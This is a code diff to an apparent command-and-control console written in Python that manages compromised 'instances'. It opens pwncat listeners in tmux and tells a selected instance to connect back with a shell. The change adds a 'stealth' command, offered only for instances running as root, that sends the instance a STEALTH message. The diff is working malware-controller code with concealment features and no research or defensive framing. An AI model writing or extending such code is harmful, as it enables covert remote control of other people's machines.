@@ -62,6 +62,9 @@ class App():
 
     @property
     def completions_with_functions(self):
+        instance_commands_if_root = {
+            'stealth': self._do_stealth
+        }
         instance_commands = {
             'pwncat': self._do_pwncat,
             'run_script': {
@@ -69,7 +72,7 @@ class App():
             },
             'shell': self._do_open_shell_bash
         }
-        global_commands = {
+        commands = {
             'show': {
                 'instances': self._list_instances
             },
@@ -80,7 +83,12 @@ class App():
             },
 
         }
-        return {**global_commands, **instance_commands} if self.selected_instance is not None and self.selected_instance.active else global_commands
+
+        if self.selected_instance is not None:
+            if self.selected_instance.is_root:
+                commands = {**commands, **instance_commands_if_root}
+            commands = {**commands, **instance_commands}
+        return commands
 
     @property
     def completions(self):
@@ -117,6 +125,9 @@ class App():
         port = PortManager.get_open_port()
         subprocess.Popen(['tmux', 'new-window', '-n', f'pc:{self.selected_instance.username}', f'pwncat -lp {port}'], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.OPEN_SHELL_CLASSIC, str(port))))
+
+    def _do_stealth(self):
+        InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.STEALTH)))
 
     def _on_instances_update(self):
         instances = InstanceManager.get_all()
